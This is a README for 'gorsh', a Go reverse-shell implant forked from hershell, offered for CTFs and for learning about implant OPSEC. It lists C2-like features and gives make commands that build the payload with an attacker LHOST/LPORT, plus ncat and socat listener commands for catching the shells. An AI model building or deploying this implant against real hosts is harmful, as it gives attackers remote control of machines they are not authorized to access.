# gorsh

[go]lang [r]everse [sh]ell

![](https://i.imgur.com/AndZ567.png)

Originally forked from - [sysdream/hershell](https://github.com/sysdream/hershell)

## Motivation

Learn go.  
Make a throwaway reverse shell for things like CTFs.  
Learn about host-based OPSEC considerations when writing an implant.

## Fork Changes
Changes after fork:

* Uses tmux as a pseudo-C2-like interface, creating a new window with each agent callback
* Download files with HTTP on all platform
* Download files with SMB on all windows
* Situational Awareness output on new shells
* Removed Meterpreter functionality
* Removed Shellcode execution
* Remove the use of passing power/shell commands at the gorsh prompt
* Add common file operation commands that use go instead of power/shell

TODO:

Potentially add reverse socks5 proxy functionality - Using
[Numbers11/rvprxmx](https://github.com/Numbers11/rvprxmx)


## Getting started

Check out the [official documentation](https://golang.org/doc/install) for an intro to developing
with Go and setting up your Golang environment (with the `$GOPATH` environment variable).

### Building the payload

First, you'll need to generate your certs:

```bash
$ make depends
```

To simplify things, read the provided Makefile. You can set the following environment variables:

-`GOOS`: the target OS
-`GOARCH`: the target architecture
-`LHOST`: the attacker IP or domain name
-`LPORT`: the listener port

See possible`GOOS`and`GOARCH`variables [here](https://golang.org/doc/install/source#environment).

For the `make` targets, you only need the`LHOST`and`LPORT`environment variables.

Generate with:

```bash
$ make {windows,macos,linux}{32,64} LHOST=example.com LPORT=443
```

## Catching the shell

The `local/start.sh` kicks off a tmux session and creates new windows on every new connection.

Shells can also be caught with:

* socat (not working on macos)
* ncat
* openssl server module
* metasploit multi handler (with a `python/shell_reverse_tcp_ssl` payload)

__Examples__

```bash
$ ncat --ssl --ssl-cert server.pem --ssl-key server.key -lvp 1234
$ socat stdio OPENSSL-LISTEN:443,cert=server.pem,key=server.key,verify=0
```

Once executed, you will be provided with the gorsh shell.
Type `help` to show what commands are supported.

## Credits

Initial Work - Ronan Kervella `<r.kervella -at- sysdream -dot- com>`

Modifications - f47h3r - [@f47h3r_b0](https://twitter.com/f47h3r_b0)
